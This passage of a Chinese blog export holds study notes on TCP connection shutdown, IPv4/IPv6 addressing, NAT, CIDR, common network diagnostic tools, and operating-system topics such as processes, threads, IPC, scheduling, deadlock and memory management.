这称为半关闭，当前留在套接字发送缓冲区中的数据将被发送掉。不管套接字的引用计数是否等于0,关闭写端的操作都会执行，即会发送FIN。 SHUT_ RDWR：相当于调用shutdown两次：第一次指定howto为SHUT_ RD，第二次指定howto为SHUT_WR。 &#x3D;&#x3D;close和shutdown的区别：&#x3D;&#x3D; close 会关闭连接，并释放所有连接对应的资源，**套接字不能再由调用进程使用**，即它不能再作为read或write的参数；而 shutdown 并不会释放掉套接字和所有的资源，关闭读仍然可以write，关闭写仍然可以read。 close 存在引用计数的概念，调用时把套接字的引用计数减1，仅在该计数变为0时才关闭套接字；shutdown 则不管引用计数，直接使得该套接字不可用，如果有别的进程企图使用该套接字，将会受到影响。 close 的引用计数导致不一定会发出 FIN 结束报文，而 shutdown 则总是会发出 FIN 结束报文，这在我们打算关闭连接通知对端的时候，是非常重要的。 close函数同时终止两个方向的数据传送：读和写。shutdown可以只终止一个方向的数据传送。 TCP的半关闭 TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。这就是所谓的半关闭，半关闭是通过调用shutdown函数代替close函数实现的。 图2-7显示了一个半关闭的典型例子。让左方的客户端开始半关闭，当然也可以由另一端开始。开始的两个报文和四次挥手一致，初始端发出FIN，接着是另一端对这个FIN的ACK报文段。但后面就和四次挥手不同，因为接收半关闭的一方仍能发送数据。我们只显示一个数据报文段和一个ACK报文段，但可能发送了许多数据报文段。当收到半关闭的一端在完成它的数据传送后， 将发送一个 FIN关闭这个方向的连接，这将传送一个文件结束符给发起这个半关闭的应用进程。当对第二个FIN进行确认后，这个连接便彻底关闭了。 终止网络连接的通常方法是调用close 函数。不过&#x3D;&#x3D;close有两个限制，通常可使用shutdown 函数来避免&#x3D;&#x3D;。 close无法直接终止连接 close函数把套接字的引用计数减1，仅在该计数变为0时才关闭套接字。 使用shutdown（howto参数为SHUT_RDWR或SHUT_WR时）可以不管引用计数就激发TCP的正常连接终止序列。 close只能同时终止两个方向的数据传送 close 函数同时终止数据传送的两个方向：读和写。 但是TCP连接是全双工的，有时候我们需要关闭写但仍然可以继续读，shutdown 函数可以完成此工作。 &#x3D;&#x3D;注意：&#x3D;&#x3D; 如果有多个进程共享一个套接字，close 每被调用一次，计数减1，直到计数为0时，也就是所有进程都调用了close, 套接字将被释放。 在多进程中，如果一个进程调用shutdown(fd, SHUT_ RDWR)后其他的进程将无法利用此套接字进行通信。如果一个进程调用close(sfd)将不会影响到其他进程。 网络层3.1 IPv4地址及网络地址转换NATIPv4连接在Internet的每台主机&#x2F;路由器都分配一个32bit的全球唯一的标识符。 IP地址的编码方式有三种：分类的IP地址、子网的划分、CIDR。 分类的IP地址 传统的IP地址是分类的地址，分为A、B、C、D、E五类。均由网络号和主机号组成，网络号代表主机所连接到的网络，主机号代表该主机或路由器在网络中的地址。 其中，存在一些特殊的IP地址用于表示特殊用途，不作为主机IP地址： 主机号全为0表示本网络本身； 主机号全为1表示本网络的广播地址； 127.0.0.1网路保留作为环路自检地址，表示任意主机本身； 32bit全为0，即0.0.0.0表示整个TCP&#x2F;IP网络； 32bit全为1，即255.255.255.255表示整个TCP&#x2F;IP网络的广播地址。 子网的划分、CIDR在下一节叙述。 网络地址转换网络地址转换（NAT）是通过将专用网络地址（比如企业内部网Intranet）转换为公用地址（如互联网Internet），从而对外隐藏了内部管理的IP地址。通过在内部使用非注册的IP地址（私有地址），并将它们转换为一小部分外部注册的IP地址（公有地址），从而减少IP地址注册的费用以及节省IPv4地址空间。 私有IP地址值用于局域网LAN，不用于无线局域网WLAN连接。因此私有IP地址不能直接用于Internet，必须通过网关利用NAT把私有IP地址转换为Intemet中合法的全球IP地址后才能用于Intermet。私有IP地址有效地解决了IP地址不足的问题。 私有IP地址网段如下: 10.0.0.0~10.255.255.255、172.16.0.0~172.31.255.255、 192.168.0.0~192.168.255.255 在因特网中的所有路由器，对目的地址是私有地址的数据报一律不进行转发。 使用NAT时，需要在专用网连接到因特网的路由器上安装NAT软件，NAT路由器至少有一个有效的外部全球地址。普通路由器在转发数据报时不改变其源IP地址和目的IP地址，且路由器工作在网络层，而NAT路由器在转发IP数据报时，一定要更换其IP地址（按路由器中的地址转换表转换源IP地址或目的IP地址）。NAT路由器转发数据报时需要查看和转换传输层的端口，其操作没有严格的层次关系。 3.2 子网划分与子网掩码、CIDR子网划分各类地址的默认子网掩码： A类: 255.0.0.0B类: 255.255.0.0C类: 255.255.255.0 使用子网划分时的地址格式： A类网络：8位 + 子网X位 + 主机24-X位B类网络：16 位 + 子网X位 + 主机16-X位C类网络：24位 + 子网X位 + 主机8-X位 无分类编址CIDR分类的IP地址的缺点： 比如一个A类地址对应的是2^24 - 2个IP地址(网络地址和广播地址)，这个是个天文数字，一个公司或者组织是无法完全利用这么多IP地址的，就造成了IP地址的浪费。 CIDR是在使用变长度子网掩码的基础上提出的一种消除传统A、B、C类网络划分，并且可以在软件的支持下实现超网构造的一种IP地址的网络划分方法。这样可以大幅度提高IP地址空间的利率，并减小路由表大小，提高路由器的路由转发能力。 无分类编址的做法是将IP分为两部分： 1、网络前缀 网络号对应的是一个网络地址，一个网络可以容纳多个主机，主机的网络号相同。 2、主机号 唯一标识一个主机在一个网络中的id。 怎么区分网络号和主机号呢？ 使用斜线记法，即IP地址&#x2F;网络前缀所占比特数，xx:xx:xx:xx&#x2F;n在IP地址后边加入了 &#x2F;n ，n代表前n位为网络号。 CIDR的主要特点： 消除了传统的A、B、C类地址以及子网的概念，因而可以更加有效地分配IPv4的地址空间。CIDR使用“网络前缀”概念代替子网络概念。这样IP地址分为两部分:网络前缀、主机号。CIDR使用斜线记法，即IP地址&#x2F;网络前缀所占比特数。其中，网络前缀所占比特数对应于网络的部分，等效于子网掩码中连续1的部分。 将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以包括多个A、B、C类地址，这种地址的聚合称为路由聚合，或称为构成超网。路由聚合使得路由表中的一个项目可以表示很多个原来传统分类地址的路由，有利于减少路由之间的路由选择信息的交换，从而提高网络性能。 3.3 ARP、RARP、ICMP ARP 在实际网络的数据链路上传送数据时，最终必须使用硬件地址MAC。所以需要一种方法来完成IP地址址到MAC地址的映射，这就要用到地址解析协议(Address Resolution Protocol, ARP)。 每台主机(路由器) 上单独地存放一个从IP地址到MAC地址的映射表，称为ARP表。主机和路由器使用地址解析协议APR来动态维护此ARP表。MAC地址转换为IP地址使用RARP协议。 ICMP 为了提高IP数据报成功交付的机会，在网络层使用了网际控制报文协议(Internet Control Message Protocol, ICMP) 来使得主机或路由器可以报告差错和异常情况。PING命令工作在应用层，但是直接使用网络层的ICMP协议，而**没有使用传输层的TCP或UDP协议**。 3.4 IPv6IPv6由128bit构成,通常使用冒号十六进制记法表示IPv6地址，每个16bit的值用四位十六进制值表示，各值之间用冒号分割，如68E6 : 8C64 : FFFFF : 0 : 1180 : 960A : FFFF。该表示方法允许使用零压缩，即一连串连续的零可以为一对冒号所取代，如DE08:0:0:0:0:0:0:B3可以写成DE08::B3；IP 地址0:0:0:0:0:0:118.17.23.1可以写成::118.17.23.1。（这里冒号分割的是16bit，点分割的是8bit） IPv6所引入的主要变化： 更大的地址空间。IPv6 将地址从IPv4的32bit增大到了128bit； 扩展的地址层次结构。 灵活的首部格式。 改进的选项。这一特征加快了分组处理速度。 允许协议继续扩充。 支持即插即用。 支持资源的预分配。 增加了安全性，身份验证和保密验证是IPv6的关键特征。 分片限制为由源点来完成，是端到端的，路由途中的路由器不允许进行分片。 网络常用测试工具ping检查网络是否通畅或者网络的连接速度。 原理：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通、时延是多少。 tracerttracert是路由跟踪实用程序，用于确定IP数据包访问目标所采取的路径。 tracert 命令用IP生存时间(TTL) 字段和ICMP错误消息来确定从一个主机到网络上其他主机的路由。其命令格式如下： 1tracert[-d] [-h maximum hops] [-j computer-list] [-W timeout] target_name 可以使用tracert命令确定数据包在网络上的停止位置。例如：tracert www.baidu.com则会打印出从当前主机到目的主机所经过的路由地址。 telnet查看某个端口是否可访问。Telnet协议是TCP&#x2F;IP协议家族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。 例如可以用telnet测试80端口的Web服务器是否正常工作。 输入telnet www .hitsz.edu.cn 80 然后服务器响应:Trying 219.223.252.3...Connected to www .hitsz .edu. cnEscape character is &#39;^] . 然后输入:GET / HTTP1.1 如果Web服务器正常工作的话，就会返回服务器的响应头，以便你确认服务器的情况。 netstatnetstat是一个监控TCP&#x2F;IP网络的非常有用的工具，它可以显示路由表、实际的网络连接以及每一个网络接口设备的状态信息。 netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。使用格式为： 1netstat [-a][-e][-n][-o][-P Protocol] [-r] [-s] [Interval] 一般用netstat -an来显示所有连接的端口并用数字表示。","raw":null,"content":null,"categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"操作系统","slug":"计算机基础/6. 操作系统","date":"2021-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.710Z","comments":true,"path":"posts/[object Object]/计算机基础/6. 操作系统/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/6.%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/undefined","excerpt":"","text":"操作系统进程管理进程进程是资源分配的基本单位（比如内存、打开的文件等），同一程序可产生多个进程（一对多关系），以允许同时有多位用户运行同一程序，却不会相互冲突。进程需要一些资源才能完成工作，如CPU使用时间、存储器、文件以及IO设备，且为依序逐一进行，也就是任何时间内仅能运行一项进程。 通常进程有如下5种状态，其中前3种是进程的基本状态。 运行状态(执行窗台)：进程正在处理器上运行。在单处理器环境下，每一时刻最多只有一个进程处于运行状态。 就绪状态：进程已处于准备运行的状态，即进程获得了除处理器之外的一切所需资源，一旦得到处理器即可运行。 阻塞状态：又称为等待状态，进程正在等待某一事件而暂停运行，如等待某资源为可用(不包括处理器)或等待输入输出完成。即使处理器空闲，该进程也不能运行。 创建状态：进程正在被创建，尚未转到就绪状态。 结束状态：进程正从系统中消失。可能是进程正常结束或其他原因中断退出运行。 进程的三个基本状态之间是可以相互转换的，如图1-1所示。 具体地说，当一个就绪进程获得处理机时，其状态由就绪变为执行； 当一个运行进程被剥夺处理机时，比如用完系统分给它的时间片、出现更高优先级别的其他进程，其状态由运行变为就绪； 当一个运行进程因某事件受阻时，如所申请资源被占用、启动IO传输未完成，其状态由执行变为阻塞； 当所等待事件发生时，如得到申请资源、IO传输完成，其状态由阻塞变为就绪。 &#x3D;&#x3D;进程与程序的区别：&#x3D;&#x3D; 进程是动态的概念，而程序是静态的概念 进程是程序及其数据在计算机上的一次运行活动，是一个动态的概念。进程的运行实体是程序、离开程序的进程没有存在的意义。从静态角度看，**进程是由程序、数据和进程控制块(PCB) 三部分组成的。而程序是一组有序的指令集合，是一种静态的概念**。 生存周期不同 进程是程序的一次执行过程，它是动态地创建和消亡的，具有一定的生命期，是暂时存在的；而程序则是一组代码的集合，它是永久存在的，可长期保存。 一个进程可以执行一个或几个程序，一个程序也可以构成多个进程。进程可创建进程，而程序不可能形成新的程序。 进程与程序的组成不同。 进程的组成包括程序、数据和进程控制块。 创建新进程时会创建新的地址空间：子进程是父进程的复制品，在fork 之后子进程获得父进程的数据空间、堆和栈的复制品，而线程使用当前的地址空间。 线程或者叫做轻量级进程（Lightweight Process, LWP）, 是程序执行流的最小单元。 一个标准的线程由线程ID，当前指令指针(PC)，寄存器集合和堆栈(stack) 组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自已不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的资源（共享进程的内存地址空间），但拥有属于自己的栈空间以及独立的执行顺序。 一、线程共享的进程环境包括： 进程代码段、进程的公有数据（如全局变量，利用这些共享的数据，线程很容易的实现相互之间的通信）、进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID。 二、线程自己的个性： 拥有这许多共性的同时，还拥有自己的个性。有了这些个性，线程才能实现并发性。这些个性包括: 线程ID 每个线程都有自己的线程ID，这个ID在本进程中是唯一的。 进程用此来标识线程。 寄存器组的值 由于线程间是并发运行的，每个线程有自已不同的运行线索，当从一个线程切换到另一个线程上时，必须将原有线程的寄存器集合的状态进行保存，以便将来该线程在被重新切换时能得以恢复。 线程的堆栈(stack) 堆栈是保证线程独立运行所必须的。线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，所以线程必须拥有自己的函数堆栈，使得函数调用可以正常执行，不受其他线程的影响。在一个进程的线程共享堆区(heap)。 错误返回码 线程的信号屏蔽码 线程的优先级 一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。 由于线程之间的相互制约，致使线程在运行中呈现出间断性。线程也有就绪、阻塞和运行三种基本状态。每一个程序都至少有一个线程，若程序只有一个线程，那就是程序本身。线程是程序中一个单一的顺序控制流程。在单个程序中同时运行多个线程完成不同的工作，称为多线程。 引入线程后，进程的内涵发生了改变，进程只作为除CPU以外系统资源的分配单元，线程则作为处理器的分配单元。在同一进程中，线程的切换不会引起进程的切换，但从一个进程中的线程切换到另一个进程中的线程时，将会引起进程的切换。 &#x3D;&#x3D;线程与进程的区别?&#x3D;&#x3D; 调度： 引入线程后，线程是独立调度的基本单位，进程是资源分配的基本单位。在同一进程中，线程的切换不会引起进程切换。在不同进程中进行的线程切换，则会引起进程切换。 拥有资源： 进程是拥有资源的基本单位，线程不拥有资源(也有一点必不可少的资源)，但线程可以共享其隶属进程的系统资源。 并发性：进程可以并发，同一进程内的多个线程也可以并发 在引入线程的操作系统中，不仅进程可以并发执行，而且同一进程内的多个线程也可以并发执行，从而使操作系统具有更好的并发性，大大提高了系统吞吐量。 系统开销：线程切换以及同步、通信的系统开销比进程小 创建和撤销进程时，系统都要为之分配或回收资源，如内存空间、IO设备等，因此操作系统所付出的开销远大于创建或撤销线程的开销。类似地，在进程切换时，涉及当前执行进程CPU环境的保存以及新调度的进程CPU环境的设置；而线程切换时只需保存和设置少量寄存器内容，因此开销很小。 另外，由于同一进程内的多个线程共享进程的地址空间，因此这些线程之间的同步与通信比较容易实现，甚至无须操作系统的干预。 地址空间和其他资源（如打开的文件）： 进程的地址空间之间互相独立，同一进程的各线程间共享进程的资源，某进程内的线程对于其他进程不可见。 通信方面： 进程间通信需要借助操作系统，而线程间可以直接读&#x2F;写进程数据段(如全局变量)来进行通信。 进程通信与进程同步多个进程可以共享系统中的各种资源，但其中许多资源一次只能为一个进程使用，我们把一次仅允许一个进程使用的资源称为临界资源。许多物理设备都属于临界资源，如打印机等。 对临界资源的访问，必须互斥的进行，**在每个进程中，访问临界资源的那段代码称为临界区(Critical Section)**。 进程通信与同步有如下一些目的： 1)数据传输：一个进程需要将它的数据发送给另一个进程; 2)共享数据： 多个进程想要操作共享数据，一个进程对共享数据的修改，别的进程应该立刻看到； 3)通知事件：一个进程需要向另一个或一组进程发送消息， 通知它(它们)发生了某种事件(如进程终止时要通知父进程); 4)资源共享：多个进程之间共享同样的资源。为了做到这一点， 需要内核提供锁和同步机制； 5)进程控制：有些进程希望完全控制另一个进程的执行(如Debug进程)，此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。 &#x3D;&#x3D;Linux下进程间通信的几种主要手段简介：&#x3D;&#x3D; 管道(Pipe) 及有名管道(named pipe) 管道可用于具有亲缘关系进程间的通信，有名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，有名管道还允许无亲缘关系进程间的通信; 信号(Signal) 信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；Linux 除了支持UNIX早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction； Message (消息队列) 消息队列是消息的链表，包括Posix消息队列System V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。 共享内存 使得多个进程可以访问同一块内存空间，是最快的可用IPC（进程间通信）形式。是针对其他通信机制运行效率较低而设计的。往往与其他通信机制，如信号量结合使用，来达到进程间的同步及互斥。 信号量(semaphore) 主要作为进程间以及同一进程不同线程之间的同步手段。 套接口(Socket) 更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由UNIX系统的BSD分支开发出来的，但现在一般可以移植到其他类UNIX系统上：Linux 和System V的变种都支持套接字。 **Linux线程间通信**：互斥体(互斥量)，信号量，条件变量。. **Windows进程间通信**：管道、共享内存、消息队列、信号量、socket。 **Windows线程间通信**：临界区(Critical Section)、互斥量(Mutex)、信号量(信号灯) (Semaphore)、事件(Event)。 **&#x3D;&#x3D;临界区(Critical section)与互斥体(Mutex) 的区别&#x3D;&#x3D;**： 临界区只能用来同步本进程内的线程，而不可用来同步多个进程中的线程；互斥量(Mutex)，信号量(Semaphore)，事件(Event) 都可以被跨越进程使用来进行同步数据操作； 临界区是非内核对象，只在用户态进行锁操作，速度快；互斥体是内核对象，在核心态进行锁操作，速度慢。 临界区和互斥体在Windows平台都下可用，Linux下只有互斥体可用。 调度算法调度的基本准则包括CPU利用率、系统吞吐量、周转时间、等待时间、响应时间等。 系统吞吐量表示单位时间内CPU完成作业的数量。 &#x3D;&#x3D;周转时间 &#x3D; 作业完成时刻 - 作业到达时刻&#x3D;&#x3D; &#x3D;&#x3D;带权周转时间 &#x3D; 周转时间 &#x2F; 所需服务时间&#x3D;&#x3D; 等待时间是指进程处于等处理器状态的时间之和，等待时间越长，用户满意度越低。 响应时间是指从用户提交请求到系统首次产生响应所用的时间。 典型调度算法包括：先来先服务算法(FCFS)、短作业优先算法(SJF)、优先级调度算法、高响应比优先调度算法、时间片轮转算法、多级反馈队列调度算法。其中SJF的平均等待时间、平均周转时间最少；最高响应比优先算法能兼顾短作业和长作业。 先来先服务算法（FCFS） 按照作业到达系统的时间依次分配服务。 短作业优先算法（SJF） 已到达的作业中优先服务所需时间短的作业。 下列作业中，J1最先到达，服务完毕后，J2、J3、J4均已到达；然后从中挑选出所需服务时间最短的J3先执行，然后是J4、J2。 高响应比优先调度算法（HRRN） &#x3D;&#x3D;响应比 &#x3D; （上一个作业的完成时间 - 本作业的到达时间 + 本作业的所需服务时间）&#x2F; 本作业的所需服务时间&#x3D;&#x3D; 其中，上一个作业的完成时间 - 本作业的到达时间，就是本作业的等待时间。 J1最先到达，先服务J1。之后再计算已到达的J2、J3、J4的响应比，从中选出响应比最高的J3先服务；J3服务完之后，再次计算J2、J4的响应比，从中选出响应比最高的J2先服务；最后服务J4。 优先级调度算法 优先级的数值越大，优先级越高 执行顺序：P2、P3、P4、P1 时间片轮转算法（RR） 用于分时系统中的进程调度。按照时间片执行，总是选择就绪队列的队首进程，让其在CPU上运行一个系统预先设置好的时间片，不考虑优先级。一个时间片内没有完成运行的进程，返回到绪队列末尾重新排队，等待下一次调度。 由于题例中各进程同时到达，则初始就绪队列为P1、P2、P3、P4，每个进程依次执行，每次仅执行一个时间片（题例中q&#x3D;1ms），执行完毕后来到队尾。执行完4个时间片后，P1又来到队首，再次依次执行。8个时间片后，P4执行满2个时间片，结束。 死锁多个进程因竞争资源而造成的一种僵局（互相等待），若无外力作用，这些进程都将无法向前推进。 死锁产生的原因 系统资源的竞争、进程推进顺序非法 死锁产生的必要条件 产生死锁必须同时满足以下四个条件，只要其中任一条件不成立， 死锁就不会发生。 互斥条件 进程要求对所分配的资源进行排他性控制，即在一段时间内某资源仅为一个进程所占有。此时若有其他进程请求该资源，则请求进程只能等待。 不剥夺条件 进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由获得该资源的进程自己来释放。 部分分配条件（请求和保持条件） 进程每次申请它所需要的一部分资源，在等待新资源的同时，进程继续占有已分配到的资源。 循环等待条件 存在一种进程资源的循环等待链，链中每个进程己获得的资源同时被链中下一个进程所请求。即存在一个处于等待状态的进程集合{${P_1, P_2, P_3, ……, P_n}$} ,其中$P_i$等待的资源被$P_{i+1}$(i&#x3D;0,1, … n-1)占有，$P_n$等待资源被$P_0$占有。 死锁的处理策略 预防死锁：设置某些限制条件，破坏产生死锁的四个必要条件中的一个或几个。 避免死锁：在资源的动态分配过程中，用某种方法防止系统进入不安全状态。银行家算法是著名的死锁避免算法。 死锁的检测及解除：无须采取任何限制性措施，允许进程在运行过程中发生死锁，通过系统的检测机制及时地检测出死锁的发生，然后采取某种措施解除死锁。 死锁的检测可利用资源分配图来描述。死锁的解除主要方法如下: (1) 资源剥夺法。 (2) 撤销进程法。 (3) 进程回退法。 &#x3D;&#x3D;银行家算法&#x3D;&#x3D; 在进程提出资源申请时，先预判此分配是否会导致系统进入不安全状态。如果会进入不安全状态，就暂时不答应这次请求，让该进程先阻塞等待。 解答： （1）系统拥有A、B、C、D类资源各3、14、12、12个。对于这4类资源，已被五个进程占有的资源量分别为A类2个、B类9个、C类10个、D类12个。因此这4类资源分别还剩A类1个、B类5个、C类2个、D类0个。 （2）首先列出各个进程的已分配allocated、尚需need，以及剩余可用资源available。然后开始寻找可行的安全序列（不唯一）。 比如，最开始的available为1 5 2 0，可满足P1、P4的need，任选其一，选择P1。P1被满足后再释放已分配的资源allocated，使得available变为1 5 3 2，这时的available可满足P3、P4的need，继续选择即可。按照这个方法可以得到一条可行的安全序列P1、P4、P2、P3、P5。 （3）先判断所提需求的0 4 2 0是否小于等于P2的need（在其需求范围内），以及同时小于等于Allocated（在可提供资源范围内）。当同时满足这两个条件时，可以更新P2的need和Allocated，即P2的need减少0 4 2 0，P2的Allocated增加0 4 2 0，以及剩余可用资源available减少0 4 2 0。接着，再按照第2问的做法，寻找可行的安全序列。若能找到安全序列，则代表系统能满足P2的请求。 内存管理操作系统对内存的划分和动态分配，就是内存管理的概念。 内存管理的功能有: 内存空间的分配与回收，包括内存的管理和共享。 地址转换，把逻辑地址转换成相应的物理地址。 内存空间的扩充，利用虚拟存储技术或自动覆盖技术，从逻辑上扩充内存。 存储保护，保证各道作业在各自的存储空间内运行，互不干扰。 逻辑地址空间与物理地址空间逻辑地址： 编译后，每个目标模块都是从0号单元开始编址，称为该目标模块的相对地址(或逻辑地址)。当链接程序将各个模块链接成一个完整的可执行目标程序时，链接程序顺序依次按各个模块的相对地址构成统一的从0号单元开始编址的逻辑地址空间。 物理地址： 物理地址空间是指内存中物理单元的集合，它是地址转换的最终地址，进程在运行时执行指令和访问数据最后都要通过物理地址来存取主存。当装入程序将可执行代码装入内存时，必须通过地址转换将逻辑地址转换成物理地址，这个过程称为地址重定位。 内存分配管理方式内存分配管理方式包括连续分配管理方式与非连续分配管理方式。 连续分配管理方式，是指为一个用户程序分配一个连续的内存空间。它主要包括单一连续分配、固定分区分配和动态分区分配。 非连续分配管理方式允许一个程序分散地装入到不相邻的内存分区中，根据分区的大小是否固定分为分页存储管理方式和分段存储管理方式。分页存储管理方式中，又根据运行作业时是否要把作业的所有页面都装入内存才能运行分为基本分页存储管理方式和请求分页存储管理方式。 固定分区： 将主内存分为固定大小的分区, 这些大小可以相等或不相等。每当我们必须分配进程内存时, 就会找到一个足够大的空闲分区来容纳该进程。然后将内存分配给进程。如果没有可用空间, 则进程在队列中等待分配内存。会产生内部碎片（处于已分配区域内部或页面内部的存储块，占有这些区域或页面的进程并不使用这个存储块。直到进程释放它，或进程结束时，系统才有可能利用这个存储块）。 动态分区 主内存不划分为多个分区, 并且为进程分配了一块足够大的可用内存。剩余的空间被视为可以由其他进程进一步使用的自由空间。会产生外部碎片（还没有被分配出去，不属于任何进程，但由于太小了无法分配给申请内存空间的新进程的内存空闲区域），外部碎片是处于任何已分配区域或页面外部的空闲存储块。这些存储块的总和可以满足当前申请的长度要求，但是由于它们的地址不连续或其他原因，使得系统无法满足当前申请。 基本分页存储管理方式基本分页存储管理方式中，分区（块）的大小是固定的；运行作业时要把作业的所有页面都装入内存才能运行； 概念 由于固定分区和动态分区都会产生内存的碎片，为了提高内存利用率，引入分页的思想：把主存空间划分为大小相等且固定的块，块相对较小，作为主存的基本单位。每个进程也以块为单位进行划分，进程在执行时，以块为单位逐个申请主存中的块空间。 特点：仅产生很小的页内碎片 分页的方法从形式上看，像分区相等的固定分区技术，分页管理不会产生外部碎片。但它又有本质的不同点： 块的大小相对分区要小很多，而且进程也按照块进行划分，进程运行时按块申请主存可用空间并执行。这样，进程只会在为最后一个不完整的块申请一个主存块空间时，才产生主存碎片，所以尽管会产生内部碎片，但是这种碎片相对于进程来说也是很小的，每个进程平均只产生半个块大小的内部碎片(也称页内碎片)。 分页存储的几个基本概念 ① 页面和页面大小 进程中的块称为页(Page)（逻辑上），内存中的块称为页框(Page Frame,或页帧)。外存也以同样的单位进行划分，称为块(Block)（物理上）。进程在执行时需要申请主存空间，就是要为每个页面分配主存中的可用页框，这就产生了页和页框的一一对应。 为方便地址转换，页面大小应是2的整数幂。同时页面大小应该适中，如果页面太小，会使进程的页面数过多，这样页表就过长，占用大量内存，而且也会增加硬件地址转换的开销，降低页面换入换出的效率；页面过大又会使页面内碎片增大，降低内存的利用率。 ②地址结构 分页存储管理的逻辑地址结构如下图所示： 地址结构包含两部分：前一部分为页号P，后一部分为页内偏移量M。地址长度为32位，其中011位为页内地址，即每页大小为$2^{12}$B，即4KB; 1231 位为页号，地址空间最多允许有$2^{20}$页。 ③页表 为了便于在内存中找到进程的每个页面所对应的物理块，系统为每个进程建立一张页表，记录页面在内存中对应的物理块号，页表一般存放在内存中。 在配置了页表后，进程执行时，通过查找该表，即可找到每页在内存中的物理块号。可见，页表的作用是实现从页号到物理块号的地址映射。 &#x3D;&#x3D;注意&#x3D;&#x3D;：页号是系统自动生成的，本身地址是线性连续的，当要访问特定地址时，只需要提供地址即可。系统会自动将地址划分为页号和页内位移，而页号对于程序员来说是没有实际意义的，因此分页地址空间是一维的。 基本分段存储管理方式基本分段存储管理方式中，段的大小是不固定的；运行作业时要把作业的所有页面都装入内存才能运行； 段式管理方式按照用户进程中的自然段划分逻辑空间。例如，用户进程由主程序、两个子程序、栈和一段数据组成，于是可以把这个用户进程划分为5个段，每段从0开始编址，并分配一段连续的地址空间（段内要求连续，段间不要求连续，因此整个作业的地址空间是二维的，段名+段内地址)。 其逻辑地址由段号s与段内偏移量W两部分组成。在下图中，段号为16位，段内偏移量为16位，则一个作业最多可有2^16&#x3D; 65536个段，最大段长为64KB。 在页式系统中，逻辑地址的页号和页内偏移量对用户是透明的，但在段式系统中，段号和段内偏移量必须由用户显示提供，在高级程序设计语言中，这个工作由编译程序完成。 &#x3D;&#x3D;分页和分段存储管理方式的区别：&#x3D;&#x3D; 分页存储管理中块是信息的物理单位，能够提高内存利用率；而分段存储管理中段是逻辑单位，分段是为了反映程序的逻辑结构，方便满足用户程序模块化的需要； 页的大小是固定的，由系统决定；而段的大小不固定，取决于用户编写的程序； 分页的地址空间是一维的，因为页是连续的；分段的地址空间是二维的，需要段名+段内地址。 段页式管理方式页式存储管理能有效地提高内存利用率，而分段存储管理能反映程序的逻辑结构并有利于段的共享。如果将这两种存储管理方法结合起来，就形成了段页式存储管理方式。 在段页式系统中，作业的地址空间首先被分成若干逻辑段，每段都有自己的段号，然后再将每一段分成若干大小固定的页。对内存空间的管理仍然和分页存储管理一样，将其分成若干和页面大小相同的存储块，对内存的分配以存储块为单位。（逻辑上分段，物理上分页） 在段页式系统中，作业的逻辑地址分为三部分：段号、页号和页内偏移量。为了实现地址变换，系统为每个进程建立一张段表，而每个分段有一张页表。段表表项中至少包括段号、页表长度和页表起始地址，页表表项中至少包括页号和块号。此外，系统中还应有一个段表寄存器，指出作业的段表起始地址和段表长度。在进行地址变换时，首先通过段表查到页表起始地址，然后通过页表找到页帧号，最后形成物理地址。 虚拟内存管理 针对的问题 前面的分页、分段、段页式存储管理都具有以下两个共同特征（缺点）：运行作业时要把作业的所有页面都装入内存才能运行；驻留性：作业被装入内存后，就一直驻留在内存中，其任何部分都不会被换出，直至作业运行结束。 由以上分析可知，许多在程序运行中不用或暂时不用的程序(数据)占据了大量的内存空间，而一些需要运行的作业又无法装入运行，显然浪费了宝贵的内存资源。 依据的原理 &#x3D;&#x3D;局部性原理&#x3D;&#x3D;是指CPU访问存储器时，无论是存取指令还是存取数据，所访问的存储单元都趋于聚集在一个较小的连续区域中。 时间局部性：在一个具有良好的时间局部性的程序中，被访问过一次的存储器位置很可能在不远的将来会被再次访问。 空间局部性：在一个具有良好空间局部性的程序中，如果一个存储器位置被访问了一次，那么程序很可能在不远的将来访问附近的一个存储器位置。 虚拟存储器的定义和特征基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面， 操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入内存的信息。这样，系统好像为用户提供了一个比实际内存大得多的存储器，称为虚拟存储器。 之所以将其称为虚拟存储器，是因为这种存储器实际上并不存在，只是由于系统提供了部分装入、请求调入和置换功能后（对用户完全透明），给用户的感觉是好像存在一个比实际物理内存大得多的存储器。 虚拟内存的实现有以下三种方式: 1)请求分页存储管理 2)请求分段存储管理 请求段页式存储管理 不管哪种方式，都需要有一定的硬件支持。一般需要的支持有以下几个方面: . 一定容量的内存和外存。 页表机制(或段表机制)，作为主要的数据结构。 中断机构，当用户程序要访问的部分尚未调入内存，则产生中断。 